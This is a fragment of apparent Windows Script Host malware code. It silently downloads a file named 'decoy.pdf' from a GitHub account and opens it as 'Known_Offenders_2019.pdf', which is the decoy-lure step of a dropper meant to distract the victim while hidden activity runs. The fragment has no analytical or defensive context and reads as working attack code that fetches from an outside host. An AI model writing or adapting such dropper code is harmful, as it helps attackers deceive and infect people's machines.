...
s.Run("curl.exe -sL -o " + t + "\\Known_Offenders_2019.pdf https://github.com/dont-delete-me-v0/files/raw/main/decoy.pdf", 0, true);
s.Run("cmd /c start \"\" " + t + "\\Known_Offenders_2019.pdf", 0, false);
